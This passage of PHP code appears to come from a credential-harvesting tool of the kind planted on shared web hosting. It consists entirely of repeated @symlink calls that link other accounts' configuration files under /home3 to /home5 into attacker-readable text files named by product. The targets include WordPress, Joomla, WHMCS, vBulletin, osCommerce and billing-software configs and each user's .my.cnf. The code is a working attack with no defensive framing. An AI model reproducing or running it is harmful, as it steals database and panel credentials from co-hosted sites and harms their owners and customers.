@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home3/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home4/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home5

@symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home5/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home5/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
